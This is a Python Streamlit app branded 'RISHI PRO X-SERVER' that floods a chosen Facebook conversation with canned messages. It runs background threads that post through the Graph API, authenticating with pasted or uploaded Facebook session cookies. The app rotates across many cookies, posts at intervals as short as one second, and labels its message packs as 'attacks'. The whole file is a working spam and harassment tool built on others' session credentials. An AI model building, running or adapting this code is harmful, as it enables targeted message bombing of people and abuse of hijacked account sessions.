import streamlit as st
import requests
import threading
import time
import random
import string
from datetime import datetime
import queue

# Page configuration
st.set_page_config(
    page_title="✨𝐑𝐈𝐒𝐇𝐈 𝐏𝐑𝐎✨",
    page_icon="✨",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Premium Pro CSS - COMPLETE
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Roboto+Mono:wght@400;500;600&display=swap');

* {
    scrollbar-width: thin;
    scrollbar-color: rgba(0,212,255,0.5) transparent;
}

.main {
    background: linear-gradient(135deg, #0a0a0f 0%, #1a1a2e 30%, #16213e 70%, #0f0f23 100%);
    background-attachment: fixed;
    position: relative;
    min-height: 100vh;
    overflow-x: hidden;
}

.main::before {
    content: '';
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: 
        radial-gradient(circle at 20% 80%, rgba(0,212,255,0.15) 0%, transparent 50%),
        radial-gradient(circle at 80% 20%, rgba(255,0,150,0.15) 0%, transparent 50%),
        radial-gradient(circle at 40% 40%, rgba(0,255,136,0.1) 0%, transparent 50%);
    z-index: 0;
    pointer-events: none;
}

.stApp {
    background: transparent;
    font-family: 'Orbitron', 'Roboto Mono', monospace;
    z-index: 10;
    position: relative;
}

.premium-title {
    font-family: 'Orbitron', monospace;
    font-size: clamp(2.5em, 5vw, 4em);
    font-weight: 900;
    background: linear-gradient(45deg, #00d4ff, #ff00ff, #00ff88, #ffaa00, #00d4ff);
    background-size: 300% 300%;
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
    background-clip: text;
    text-align: center;
    margin: 20px 0 40px 0;
    padding: 25px;
    text-shadow: 0 0 40px rgba(0,212,255,0.6);
    position: relative;
    z-index: 20;
}

.metric-container {
    background: rgba(15, 15, 25, 0.95) !important;
    backdrop-filter: blur(20px);
    border: 1px solid rgba(0,212,255,0.4);
    border-radius: 20px;
    padding: 25px !important;
    margin: 10px 0 !important;
    box-shadow: 0 25px 50px rgba(0,0,0,0.7);
    transition: all 0.3s ease;
    position: relative;
    z-index: 20;
}

.metric-container:hover {
    border-color: rgba(0,212,255,0.8);
    box-shadow: 0 30px 60px rgba(0,212,255,0.3);
    transform: translateY(-5px);
}

.glass-panel {
    background: rgba(20, 20, 40, 0.92);
    backdrop-filter: blur(25px);
    border: 1px solid rgba(0,212,255,0.25);
    border-radius: 25px;
    padding: 35px;
    margin: 25px 0;
    box-shadow: 0 30px 60px rgba(0,0,0,0.8);
    position: relative;
    z-index: 20;
    border-image: linear-gradient(45deg, rgba(0,212,255,0.5), rgba(255,0,150,0.5)) 1;
}

.live-log-container {
    background: rgba(10, 10, 25, 0.97) !important;
    backdrop-filter: blur(30px);
    border: 2px solid rgba(0,255,136,0.5);
    border-radius: 25px;
    padding: 30px;
    height: 550px;
    overflow-y: auto;
    font-family: 'Roboto Mono', monospace;
    font-size: 15px;
    line-height: 1.7;
    box-shadow: inset 0 0 40px rgba(0,255,136,0.15), 0 25px 50px rgba(0,0,0,0.8);
    position: relative;
    z-index: 20;
}

.live-log-container::-webkit-scrollbar {
    width: 8px;
}

.live-log-container::-webkit-scrollbar-track {
    background: rgba(10,10,25,0.8);
    border-radius: 10px;
}

.live-log-container::-webkit-scrollbar-thumb {
    background: linear-gradient(45deg, #00d4ff, #00ff88);
    border-radius: 10px;
}

.log-success { 
    color: #00ff88 !important; 
    font-weight: 600; 
    text-shadow: 0 0 10px rgba(0,255,136,0.5);
    margin: 4px 0;
}

.log-error { 
    color: #ff4757 !important; 
    font-weight: 600; 
    text-shadow: 0 0 10px rgba(255,71,87,0.5);
    margin: 4px 0;
}

.log-info { 
    color: #00d4ff !important; 
    font-weight: 500;
    margin: 4px 0;
}

.stTextInput > div > div > input,
.stTextArea > div > div > textarea,
.stSelectbox > div,
.stNumberInput > div > div > input,
.stSlider > div {
    background: rgba(10, 10, 25, 0.95) !important;
    color: #ffffff !important;
    border: 2px solid rgba(0,212,255,0.6) !important;
    border-radius: 18px !important;
    padding: 15px 18px !important;
    font-weight: 500 !important;
    font-family: 'Roboto Mono', monospace !important;
    backdrop-filter: blur(15px);
    transition: all 0.4s ease !important;
    box-shadow: 0 8px 25px rgba(0,0,0,0.5);
}

.stTextInput > div > div > input:focus,
.stTextArea > div > div > textarea:focus {
    border-color: #00d4ff !important;
    box-shadow: 0 0 25px rgba(0,212,255,0.6) !important;
    transform: translateY(-2px);
}

.stButton > button {
    background: linear-gradient(45deg, #00d4ff, #0099ff, #00ff88) !important;
    color: #ffffff !important;
    border: none !important;
    border-radius: 20px !important;
    font-weight: 700 !important;
    font-size: 18px !important;
    padding: 18px 35px !important;
    font-family: 'Orbitron', monospace !important;
    text-transform: uppercase !important;
    letter-spacing: 2px !important;
    box-shadow: 0 15px 40px rgba(0,212,255,0.5) !important;
    transition: all 0.4s cubic-bezier(0.25, 0.46, 0.45, 0.94) !important;
    position: relative;
    overflow: hidden;
    min-width: 200px;
    height: 60px;
}

.stButton > button:hover {
    background: linear-gradient(45deg, #0099ff, #00ff88, #00d4ff) !important;
    transform: translateY(-5px) scale(1.02) !important;
    box-shadow: 0 25px 60px rgba(0,212,255,0.7) !important;
}

.stButton > button:active {
    transform: translateY(-2px) scale(1.01) !important;
}

.task-table {
    background: rgba(15, 15, 25, 0.95);
    backdrop-filter: blur(20px);
    border-radius: 25px;
    overflow: hidden;
    border: 1px solid rgba(0,212,255,0.4);
    box-shadow: 0 25px 50px rgba(0,0,0,0.7);
}

.status-running { 
    color: #00ff88 !important; 
    font-weight: bold; 
    text-shadow: 0 0 10px rgba(0,255,136,0.5);
}

.status-stopped { 
    color: #ff4757 !important; 
    font-weight: bold; 
    text-shadow: 0 0 10px rgba(255,71,87,0.5);
}

[data-testid="stMetricValue"] {
    font-family: 'Orbitron', monospace !important;
    font-weight: 700 !important;
    font-size: 2em !important;
    color: #00ff88 !important;
    text-shadow: 0 0 15px rgba(0,255,136,0.5);
}

[data-testid="stMetricLabel"] {
    color: #00d4ff !important;
    font-family: 'Orbitron', monospace !important;
    font-weight: 500 !important;
}
</style>
""", unsafe_allow_html=True)

# Headers for requests
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://www.facebook.com/'
}

# COMPLETE Pre-loaded message files
PRELOADED_FILES = {
    "🔥 Rishi Premium 🔥": [
        "✨ RISHI PRO LIVE", "⚡ ULTRA FAST MODE", "💎 PREMIUM ACTIVE", 
        "🚀 ELITE SERVER", "🌟 PRO VERSION", "🔥 LIVE STREAMING",
        "💥 RISHI X-SERVER", "⚡ HIGH SPEED", "✨ PREMIUM MODE"
    ],
    "⚡ Pro Attack ⚡": [
        "🚀 PRO ATTACK LIVE", "⚡ ULTRA SPEED", "💥 ELITE MODE", 
        "🔥 MAX POWER", "🌟 PREMIUM HIT", "💎 VIP ATTACK",
        "✨ PRO LIVE", "⚡ FASTEST MODE"
    ],
    "💎 Elite Messages 💎": [
        "💎 ELITE PRO", "✨ PREMIUM LIVE", "⚡ ULTRA FAST", 
        "🚀 RISHI ELITE", "🔥 PRO MAX", "🌟 VIP MODE",
        "💥 ELITE ATTACK", "✨ PRO SERVER"
    ],
    "🚀 Bot Response 🚀": [
        "🤖 AUTO REPLY LIVE", "⚡ BOT ACTIVE", "💎 PRO BOT", 
        "🔥 AUTO MODE", "✨ LIVE RESPONSE", "🚀 BOT ONLINE"
    ]
}

# Initialize COMPLETE session state
if 'tasks' not in st.session_state:
    st.session_state.tasks = {}
if 'stop_events' not in st.session_state:
    st.session_state.stop_events = {}
if 'active_threads' not in st.session_state:
    st.session_state.active_threads = {}
if 'message_log' not in st.session_state:
    st.session_state.message_log = []
if 'total_messages_sent' not in st.session_state:
    st.session_state.total_messages_sent = 0
if 'log_placeholder' not in st.session_state:
    st.session_state.log_placeholder = None
if 'log_update_counter' not in st.session_state:
    st.session_state.log_update_counter = 0

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    """COMPLETE message sending function with LIVE logging"""
    stop_event = st.session_state.stop_events[task_id]
    st.session_state.tasks[task_id] = {
        "status": "Running", 
        "start_time": datetime.now(),
        "messages_sent": 0,
        "cookies_used": len(cookies_list),
        "thread_id": thread_id,
        "sender": mn
    }
    
    message_count = 0
    cookie_index = 0
    
    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                break
                
            if cookie_index >= len(cookies_list):
                cookie_index = 0
                
            cookie = cookies_list[cookie_index]
            cookie_index += 1
            
            try:
                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                full_message = f"{mn} {message1}"
                
                # Create session with cookies
                session = requests.Session()
                cookie_dict = {}
                for c in cookie.strip().split(';'):
                    if '=' in c:
                        key, value = c.strip().split('=', 1)
                        cookie_dict[key] = value
                
                session.cookies.update(cookie_dict)
                session.headers.update(headers)
                
                parameters = {'message': full_message}
                response = session.post(api_url, data=parameters, timeout=10)
                
                current_time = datetime.now().strftime("%H:%M:%S")
                
                if response.status_code == 200:
                    log_message = f"✅ [{current_time}] {full_message[:40]}... | ✅ SENT SUCCESSFULLY"
                    st.session_state.message_log.append(("success", log_message))
                    message_count += 1
                    st.session_state.tasks[task_id]["messages_sent"] = message_count
                    st.session_state.total_messages_sent += 1
                else:
                    log_message = f"❌ [{current_time}] FAILED | Code: {response.status_code}"
                    st.session_state.message_log.append(("error", log_message))
                
                # Limit log size
                if len(st.session_state.message_log) > 150:
                    st.session_state.message_log.pop(0)
                
                time.sleep(time_interval)
                
            except Exception as e:
                current_time = datetime.now().strftime("%H:%M:%S")
                error_msg = str(e)[:60]
                log_message = f"⚠️ [{current_time}] ERROR: {error_msg}..."
                st.session_state.message_log.append(("error", log_message))
                time.sleep(2)
    
    st.session_state.tasks[task_id]["status"] = "Stopped"
    st.session_state.tasks[task_id]["end_time"] = datetime.now()

def start_task(cookies_list, thread_id, mn, time_interval, messages):
    """COMPLETE task starter"""
    task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    st.session_state.stop_events[task_id] = threading.Event()
    
    thread = threading.Thread(
        target=send_messages, 
        args=(cookies_list, thread_id, mn, time_interval, messages, task_id),
        name=f"Task_{task_id}",
        daemon=True
    )
    thread.start()
    
    st.session_state.active_threads[task_id] = thread
    return task_id

def stop_task(task_id):
    """COMPLETE task stopper"""
    if task_id in st.session_state.stop_events:
        st.session_state.stop_events[task_id].set()
        if task_id in st.session_state.active_threads:
            del st.session_state.active_threads[task_id]
        return True
    return False

def stop_all_tasks():
    """COMPLETE all tasks stopper"""
    for task_id in list(st.session_state.stop_events.keys()):
        stop_task(task_id)
    st.session_state.tasks = {}

def update_live_logs():
    """COMPLETE live log updater"""
    if st.session_state.log_placeholder:
        with st.session_state.log_placeholder.container():
            st.markdown('<div class="live-log-container">', unsafe_allow_html=True)
            
            if st.session_state.message_log:
                for log_type, log_msg in reversed(st.session_state.message_log[-50:]):
                    if log_type == "success":
                        st.markdown(f'<div class="log-success">{log_msg}</div>', unsafe_allow_html=True)
                    elif log_type == "error":
                        st.markdown(f'<div class="log-error">{log_msg}</div>', unsafe_allow_html=True)
                    else:
                        st.markdown(f'<div class="log-info">{log_msg}</div>', unsafe_allow_html=True)
            else:
                st.markdown('<div class="log-info">🚀 RISHI PRO | LIVE MODE ACTIVE | WAITING FOR MESSAGES...</div>', unsafe_allow_html=True)
            
            st.markdown('</div>', unsafe_allow_html=True)

# MAIN APP - COMPLETE
st.markdown('<div class="premium-title">✨ 𝐑𝐈𝐒𝐇𝐈 𝐏𝐑𝐎 𝐗-𝐒𝐄𝐑𝐕𝐄𝐑 ✨<br><span style="font-size: 0.4em; font-weight: 400;">PREMIUM EDITION | LIVE LOGS | ULTRA FAST</span></div>', unsafe_allow_html=True)

# DASHBOARD METRICS - COMPLETE
col1, col2, col3, col4 = st.columns(4)
with col1:
    st.markdown('<div class="metric-container">', unsafe_allow_html=True)
    active_tasks = len([t for t in st.session_state.tasks.values() if t.get("status") == "Running"])
    st.metric("🔥 LIVE TASKS", active_tasks)
    st.markdown('</div>', unsafe_allow_html=True)

with col2:
    st.markdown('<div class="metric-container">', unsafe_allow_html=True)
    st.metric("📨 TOTAL SENT", st.session_state.total_messages_sent)
    st.markdown('</div>', unsafe_allow_html=True)

with col3:
    st.markdown('<div class="metric-container">', unsafe_allow_html=True)
    active_threads_count = len([t for t in threading.enumerate() if t.name.startswith("Task_")])
    st.metric("⚡ LIVE THREADS", active_threads_count)
    st.markdown('</div>', unsafe_allow_html=True)

with col4:
    st.markdown('<div class="metric-container">', unsafe_allow_html=True)
    total_cookies = sum(task.get("cookies_used", 0) for task in st.session_state.tasks.values())
    st.metric("🍪 COOKIES", total_cookies)
    st.markdown('</div>', unsafe_allow_html=True)

# CREATE TASK FORM - COMPLETE
st.markdown('<div class="glass-panel">', unsafe_allow_html=True)
st.markdown("### 🚀 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎 𝐓𝐀𝐒𝐊 𝐂𝐑𝐄𝐀𝐓𝐎𝐑")
with st.form("pro_form", clear_on_submit=False):
    col1, col2 = st.columns([1.2, 1])
    
    with col1:
        st.markdown("#### 🍪 𝐅𝐁 𝐏𝐑𝐎 𝐂𝐎𝐎𝐊𝐈𝐄𝐒")
        cookie_option = st.radio("Cookie Method:", ["📝 Single Cookie", "📁 Multiple Cookies"], horizontal=True)
        
        cookies_list = []
        if cookie_option == "📝 Single Cookie":
            cookie_text = st.text_area(
                "Paste FB Cookie:", 
                placeholder="datr=xxx; sb=xxx; c_user=xxx; xs=xxx;", 
                height=120
            )
            if cookie_text.strip():
                cookies_list = [cookie_text.strip()]
        else:
            uploaded_file = st.file_uploader("Upload Cookies File (.txt)", type=['txt'])
            if uploaded_file:
                cookies_list = [line.strip() for line in uploaded_file.read().decode().splitlines() if line.strip()]
        
        if cookies_list:
            st.success(f"✅ **{len(cookies_list)}** PRO Cookies Loaded!")
    
    with col2:
        st.markdown("#### 💬 𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐄𝐓𝐀𝐈𝐋𝐒")
        thread_id = st.text_input("💬 Conversation UID", placeholder="t_xxxxxxxxxx")
        sender_name = st.text_input("👤 Sender Name", placeholder="RISHI PRO")
    
    time_interval = st.slider("⚡ Speed (seconds)", 1, 60, 3)
    
    st.markdown("#### 📝 𝐏𝐑𝐎 𝐌𝐄𝐒𝐒𝐀𝐆𝐄 𝐏𝐀𝐂𝐊")
    selected_pack = st.selectbox("Select Message Pack:", list(PRELOADED_FILES.keys()))
    messages = PRELOADED_FILES[selected_pack]
    
    with st.expander("📋 Preview Messages", expanded=False):
        for i, msg in enumerate(messages[:8], 1):
            st.write(f"{i}. **{sender_name}** {msg}")
        if len(messages) > 8:
            st.write(f"... **and {len(messages)-8} more messages**")
    
    col1, col2, col3 = st.columns([1, 3, 1])
    with col2:
        start_btn = st.form_submit_button(
            "🚀 𝐒𝐓𝐀𝐑𝐓 𝐏𝐑𝐎 𝐒𝐄𝐑𝐕𝐄𝐑 🚀", 
            use_container_width=True,
            help="Start LIVE PRO Server"
        )
    
    if start_btn:
        if not cookies_list:
            st.error("❌ **No Cookies!** Add at least 1 cookie.")
        elif not thread_id:
            st.error("❌ **Conversation UID** required!")
        elif not sender_name:
            st.error("❌ **Sender Name** required!")
        elif not messages:
            st.error("❌ **Select Message Pack!**")
        else:
            task_id = start_task(cookies_list, thread_id, sender_name, time_interval, messages)
            st.success(f"✅ **PRO TASK STARTED!** ID: `{task_id}` 🚀")
            st.balloons()
            time.sleep(1)
            st.rerun()

st.markdown('</div>', unsafe_allow_html=True)

# CONTROL PANEL - COMPLETE
st.markdown('<div class="glass-panel">', unsafe_allow_html=True)
st.markdown("### 🎮 𝐏𝐑𝐎 𝐂𝐎𝐍𝐓𝐑𝐎𝐋 𝐏𝐀𝐍𝐄𝐋")
col1, col2 = st.columns(2)

with col1:
    with st.form("control_form"):
        task_id_input = st.text_input("🆔 Task ID", placeholder="Enter Task ID to STOP")
        stop_col1, stop_col2 = st.columns(2)
        with stop_col1:
            stop_task_btn = st.form_submit_button("🛑 STOP TASK", use_container_width=True)
        with stop_col2:
            stop_all_btn = st.form_submit_button("💥 STOP ALL", use_container_width=True)
        
        if stop_task_btn and task_id_input:
            if stop_task(task_id_input):
                st.success(f"✅ **Task {task_id_input}** STOPPED!")
                st.rerun()
            else:
                st.error(f"❌ **Task {task_id_input}** not found!")
        
        if stop_all_btn:
            stop_all_tasks()
            st.warning("🔴 **ALL TASKS STOPPED!**")
            st.rerun()

with col2:
    col1, col2 = st.columns(2)
    with col1:
        if st.button("🗑️ CLEAR LOGS", use_container_width=True):
            st.session_state.message_log = []
            st.success("✅ **LOGS CLEARED!**")
            st.rerun()
    with col2:
        if st.button("🔄 REFRESH", use_container_width=True):
            st.rerun()

st.markdown('</div>', unsafe_allow_html=True)

# ACTIVE TASKS TABLE - COMPLETE
st.markdown('<div class="glass-panel">', unsafe_allow_html=True)
st.markdown("### 📊 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎 𝐓𝐀𝐒𝐊 𝐃𝐀𝐒𝐇𝐁𝐎𝐀𝐑𝐃")

if st.session_state.tasks:
    tasks_data = []
    for task_id, info in st.session_state.tasks.items():
        status_class = "status-running" if info["status"] == "Running" else "status-stopped"
        duration = str(datetime.now() - info["start_time"]).split('.')[0]
        tasks_data.append({
            "🆔 ID": task_id[:8],
            "📊 Status": f'<span class="{status_class}">{info["status"]}</span>',
            "📨 Sent": info.get("messages_sent", 0),
            "🍪 Cookies": info.get("cookies_used", 0),
            "⏱️ Duration": duration,
            "💬 Target": info.get("thread_id", "N/A")[-8:],
            "👤 Sender": info.get("sender", "N/A")
        })
    
    st.markdown('<div class="task-table">', unsafe_allow_html=True)
    st.dataframe(
        tasks_data, 
        use_container_width=True, 
        hide_index=True,
        column_config={
            "📨 Sent": st.column_config.NumberColumn("Messages", format="%.0f"),
            "🍪 Cookies": st.column_config.NumberColumn("Cookies", format="%.0f")
        }
    )
    st.markdown('</div>', unsafe_allow_html=True)
else:
    st.info("📭 **No active PRO tasks.** Create one above! 🚀")

st.markdown('</div>', unsafe_allow_html=True)

# LIVE LOGS - COMPLETE FIXED VERSION
st.markdown('<div class="glass-panel">', unsafe_allow_html=True)
st.markdown("### 📡 𝐋𝐈𝐕𝐄 𝐏𝐑𝐎 𝐋𝐎𝐆𝐒 ✨ **(Real-time Updates)")

st.session_state.log_placeholder = st.empty()
st.session_state.log_update_counter += 1

# Force log update every run
update_live_logs()

st.markdown('</div>', unsafe_allow_html=True)

# FOOTER - COMPLETE
st.markdown("""
<div style='
    text-align: center; 
    padding: 40px 30px; 
    color: rgba(0,212,255,0.9); 
    font-family: "Orbitron", monospace; 
    font-size: 16px;
    font-weight: 500;
    border-top: 2px solid rgba(0,212,255,0.4);
    margin-top: 50px;
    background: rgba(15,15,25,0.8);
    backdrop-filter: blur(20px);
    border-radius: 25px;
'>
    ✨ **𝐑𝐈𝐒𝐇𝐈 𝐏𝐑𝐎 𝐗-𝐒𝐄𝐑𝐕𝐄𝐑** | Premium Edition | Ultra Fast Live Logs | 2026 ✨
</div>
""", unsafe_allow_html=True)

# Auto-refresh for live logs (every 2 seconds)
time.sleep(0.1)
